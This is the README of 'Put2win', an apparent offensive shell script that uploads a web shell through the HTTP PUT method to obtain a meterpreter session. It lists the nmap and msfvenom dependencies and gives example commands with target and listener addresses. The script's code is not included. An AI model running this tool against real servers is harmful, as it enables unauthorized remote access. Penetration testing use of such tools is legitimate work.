# Put2win
<script src="https://asciinema.org/a/0GFJCJzRQZBlWYAxco2ONqODZ.js" id="asciicast-0GFJCJzRQZBlWYAxco2ONqODZ" async></script>

# Dependencies
It's necessary to have installed nmap and msfvenom tools for a correct operation

# Usage
./Put2win.sh -h                                    
This script automatize shell upload by PUT HTTP method to get meterpreter.

Usage:
 ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST

Examples:
 - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10
 - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10

# Contact
Telegram: @devploit
Twitter: https://www.twitter.com/devploit
